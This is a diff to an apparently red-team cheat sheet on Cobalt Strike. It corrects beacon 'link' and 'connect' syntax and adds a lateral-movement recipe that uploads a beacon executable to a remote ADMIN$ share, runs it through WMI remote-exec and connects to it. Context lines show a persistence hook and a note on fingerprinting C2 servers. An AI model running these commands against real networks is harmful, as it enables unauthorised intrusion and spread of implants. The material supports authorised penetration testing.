@@ -165,7 +165,7 @@ ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscrip
 - Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
 ```
 connect <IP> <PORT>
-link <IP>
+link <IP> <PIPE>
 ```
 #### OPSEC listeners
 - DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.
@@ -381,9 +381,17 @@ jump psexec64 <HOSTNAME> <LISTENER>
 - Not a jump command but can be used manually
 ```
 cd \\<HOSTNAME>\ADMIN$
-upload <BEACON EXE>
+upload <SMB BEACON EXE>
 remote-exec wmi <HOSTNAME> <BEACON EXE>
-link <HOSTNAME>
+link <HOSTNAME> <PIPE>
+```
+
+
+```
+cd \\<HOSTNAME>\ADMIN$
+upload <TCP BEACON EXE>
+remote-exec wmi <HOSTNAME> <BEACON EXE>
+connect <HOSTNAME> <PORT>
 ```
 
 ### WMI exec commands
